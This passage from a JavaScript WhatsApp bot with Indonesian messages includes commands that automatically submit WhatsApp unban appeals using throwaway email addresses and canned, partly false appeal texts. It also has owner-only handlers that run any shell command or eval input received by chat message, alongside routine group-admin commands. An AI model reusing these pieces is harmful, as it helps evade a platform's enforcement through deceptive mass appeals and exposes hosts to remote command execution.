form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "linkgc": case "linkgroup":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await Biiofc.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case "hidetag": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!q) return reply(`Teks?`)
global.hit = q
Biiofc.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeKayla) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "antilink":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif!*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif!*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
reply(`Command Salah Silahkan Gunakan Command Seperti Ini ${prefix}antilink on/off\n${prefix}antilink on = Untuk Menyalakan\n${prefix}antilink off = Untuk Mematikan`)
}
}
break
default:
}
if (budy.startsWith('$')) {
if (!isOwner) return reply(`CIEE MAU COLONG SC OWNER GW ANJ!! OTW BOT SPAM BUG😎`)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})